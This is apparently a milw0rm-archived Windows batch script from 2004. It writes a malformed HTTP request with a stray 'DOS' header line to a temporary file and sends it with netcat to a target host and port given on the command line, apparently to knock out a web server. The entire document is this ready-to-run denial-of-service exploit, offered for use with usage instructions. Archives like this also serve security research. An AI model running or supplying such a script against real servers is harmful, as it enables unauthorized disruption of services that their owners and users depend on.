if '%1'=='' echo Usage:%0 target [port]&&goto :eof
set PORT=80
if not '%2'=='' set PORT=%2
for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe echo Need nc.exe&&goto :eof
echo GET / HTTP/1.0>http.tmp
echo HOST: %1>>http.tmp
echo DOS>>http.tmp
echo.>>http.tmp
nc -w 10 %1 %PORT% < http.tmp
del http.tmp

# milw0rm.com [2004-07-22]
